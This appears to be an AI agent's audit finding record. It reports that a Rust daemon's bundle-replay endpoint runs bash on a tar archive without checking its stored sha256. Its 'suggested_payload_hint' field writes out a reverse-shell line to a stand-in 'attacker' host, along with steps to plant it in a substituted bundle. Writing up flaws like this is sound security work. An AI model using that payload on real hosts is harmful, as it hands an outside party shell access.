record_exploration_finding
{
  "path": "crates/nyx-agent-api/src/router.rs",
  "line": 1789,
  "cap": "INTEGRITY_VIOLATION",
  "endpoint": "POST /api/v1/findings/:id/replay",
  "rationale": "replay_repro_bundle reads the bundle bytes from disk (`std::fs::read(&bundle_path)`), pipes them through extract_ustar, and execs `bash <id>/repro.sh`. The repro_bundles row carries an authoritative `sha256` column (build_bundle stamps blake3_hex(&tar_bytes) at write time, repro_bundle.rs:139), but the replay path never recomputes the digest and never compares against the stored value before extraction. The download endpoint exposes the digest as `X-Nyx-Bundle-Sha256` to advertise integrity, yet the replay endpoint — the one that actually executes the bundle — silently trusts on-disk bytes. Anyone who can write the bundle file on the daemon host (state_bundles_dir is configured with the same perms as the rest of state_dir; a co-tenant process, a backup-restore mishap, or an `rsync --delete` followed by a substituted .tar) gets unaudited shell execution under the daemon's identity the next time the operator clicks `Replay`. The stored sha256 becomes false assurance. Static pass missed because the bug is the *absence* of a verification call — no taint flows the wrong way; the right flow simply does not exist.",
  "suggested_payload_hint": "overwrite <state_bundles_dir>/<finding-id>.tar with a USTAR archive whose <id>/repro.sh body is `#!/bin/sh\\nbash -i >& /dev/tcp/attacker/4444 0>&1`; leave the repro_bundles row + its sha256 untouched; trigger POST /findings/<id>/replay; observe shell — and observe that the digest in the row no longer matches the bytes that ran."
}

